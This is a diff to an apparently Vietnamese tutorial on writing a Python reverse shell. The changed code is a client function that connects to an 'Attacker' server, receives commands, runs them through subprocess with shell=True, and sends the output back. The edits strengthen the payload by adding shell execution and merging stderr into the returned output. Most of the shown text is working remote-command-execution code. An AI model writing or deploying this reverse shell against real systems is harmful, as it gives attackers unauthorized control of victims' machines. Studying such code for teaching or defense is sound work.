@@ -129,17 +129,17 @@ try:
     while True:
         # Nhận input từ người dùng
         message = input("Nhập tin nhắn để gửi đến server (gõ 'quit' để thoát): ")
-        
+
         if message.lower() == 'quit':
             break
-        
+
         # Mã hóa và gửi dữ liệu đến server
         client_socket.sendall(message.encode('utf-8'))
-        
+
         # (Tùy chọn) Nhận phản hồi từ server
         response = client_socket.recv(1024)
         print(f"Server phản hồi: {response.decode('utf-8')}")
-        
+
 except ConnectionRefusedError:
     print("Lỗi: Không thể kết nối. Hãy đảm bảo Server đang chạy.")
 except Exception as e:
@@ -172,11 +172,11 @@ conn.send(command.encode('utf-8') + b'\n')
 ```
 import subprocess
 
-output = subprocess.run(command, check=True)
+output = subprocess.run(command, shell=True)
 ```
 Như vậy, bên phía client sẽ nhận lệnh, thực thi và gửi lại phía server kết quả
 ```
-command = s.recv(1024).decode('utf-8').strip()
+command = s.recv(1024).decode('utf-8')
 output = subprocess.run(command, check=True)
 s.sendall(output.stdout)
 ```
@@ -261,7 +261,7 @@ def reverse_shell():
     # Vòng lặp chính để nhận và thực thi lệnh
     while True:
         # 2. Nhận lệnh từ Server (Attacker)
-        command = s.recv(1024).decode('utf-8').strip()
+        command = s.recv(1024).decode('utf-8')
 
         if not command or command.lower() == 'exit':
             s.send(b"[!] Closing.\n")
@@ -270,14 +270,10 @@ def reverse_shell():
         # 3. Thực thi lệnh sử dụng subprocess.run, redirect std vào PIPE
         try:
             # Khởi tạo tiến trình con
-            output = subprocess.run(
-                command,
-                check=True,
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            # 4. Gửi stdout về server. output là 1 namespace có cả stderr, ...
+            # Sử dụng để thực hiện lệnh như lệnh Shell mà không bị lỗi
+            # Redirect stderr ra stdout
+            output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            # 4. Gửi stdout về server. output là 1 namespace có cả stderr, ... nhưng đã dùng redirect để lấy cả stdout và stderr
             s.sendall(output.stdout)
         except Exception as e:
             s.send(f"[-] Error: {str(e)}".encode('utf-8'))
@@ -287,6 +283,7 @@ def reverse_shell():
 
 if __name__ == '__main__':
     reverse_shell()
+
 ```
 </details>
 
